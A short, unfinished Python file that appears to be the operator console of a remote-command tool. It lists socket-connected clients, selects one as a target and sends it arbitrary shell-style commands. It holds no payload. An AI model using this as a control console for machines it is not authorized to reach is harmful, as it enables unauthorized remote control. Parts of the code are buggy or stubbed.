from socketbinder import SocketBinder


class Commander:
    def __init__(self, socketbinder):
        self.sb = socketbinder
        self.index = -1
        self.t_socket = None


    def set_target(self, i):
        if i < 0 or i >= len(self.sb.client_list):
            self.index = -1
            self.t_socket = None
        else:
            self.index = i
            self.t_socket = self.sb.client_list[i][1]
            print(self.sb.client_list[i][0])


    def send_command(self, command):
        self.t_socket.sendall(command.encode())
        res = self.t_socket.recv(self.sb.SIZE).decode()

        if res ==  'Error':
            self.set_target(-1)
            sb.terminate_connect(self.index)

        return res


    def send_file(self, filename):
        pass


if __name__ == '__main__':
    sb = SocketBinder()
    c = Commander(sb)

    while True:
        cmd = input('>>> ')
        cmd = cmd.split(' ')

        if cmd[0] == 'exit':
            break

        elif cmd[0] == 'stat':
            print('now index: {}'.format(c.index))
            c.sb.get_client_list()

        elif cmd[0] == 'enter':
            c.set_target(int(cmd[1]))

        elif cmd[0] == 'cmd':
            print(c.send_command(' '.join(cmd[1:])))
            continue

